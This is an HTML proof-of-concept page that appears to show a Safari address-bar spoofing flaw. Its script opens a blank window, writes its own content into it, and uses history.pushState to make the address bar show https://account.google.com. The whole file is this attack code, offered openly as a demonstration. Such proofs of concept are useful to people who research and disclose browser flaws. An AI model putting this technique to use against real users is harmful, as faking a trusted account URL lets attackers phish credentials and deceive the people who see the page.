<!DOCTYPE html>                                                                                                                                                                                           
      <html>                                                                                                                                                                                                    
      <head>                                                                                                                                                                                                    
        <title>POC for URL Spoofing</title>                                                                                                                                                                     
      </head>                                                                                                                                                                                                   
      <body>                                                                                                                                                                                                    
        <h1>Safari URL Spoofing POC</h1>                                                                                                                                                                        
        <p>Click the button below to demonstrate the vulnerability.</p>                                                                                                                                         
        <button onclick="spoof()">Run Test</button>                                                                                                                                                             
                                                                                                                                                                                                                
        <script>                                                                                                                                                                                                
          function spoof() {                                                                                                                                                                                    
            // 1. Define the target URL to spoof and the page content.                                                                                                                                          
            const targetURL = "https://account.google.com";                                                                                                                                                     
            const pageContent = `                                                                                                                                                                               
              <h1>This is a test page</h1>                                                                                                                                                                      
              <p>The address bar should show: ${targetURL}</p>                                                                                                                                                  
              <p>This demonstrates that the displayed URL can be manipulated.</p>                                                                                                                               
            `;                                                                                                                                                                                                  
                                                                                                                                                                                                                
            // 2. Open a new, blank window.                                                                                                                                                                     
            const newWindow = window.open('about:blank', '_blank');                                                                                                                                             
                                                                                                                                                                                                                
            if (newWindow) {                                                                                                                                                                                    
              // 3. Write the simple content to the new window.                                                                                                                                                 
              newWindow.document.write(pageContent);                                                                                                                                                            
              newWindow.document.close();                                                                                                                                                                       
                                                                                                                                                                                                                
              try {                                                                                                                                                                                             
                // 4. Use history.pushState to change the displayed URL.                                                                                                                                        
                // This is the core of the spoofing technique.                                                                                                                                                  
                newWindow.history.pushState(null, '', targetURL);                                                                                                                                               
              } catch (e) {                                                                                                                                                                                     
                // If the browser blocks this, log the error.                                                                                                                                                   
                console.error("Failed to push state:", e);                                                                                                                                                      
                newWindow.document.write("<p>Error: Could not change the URL. The browser may have blocked this action.</p>");                                                                                  
              }                                                                                                                                                                                                 
            } else {                                                                                                                                                                                            
              alert("Popup blocker may be preventing the test from running.");                                                                                                                                  
            }                                                                                                                                                                                                   
          }                                                                                                                                                                                                     
        </script>                                                                                                                                                                                               
      </body>                                                                                                                                                                                                   
      </html>                                                                                                                                                                                                   
                  
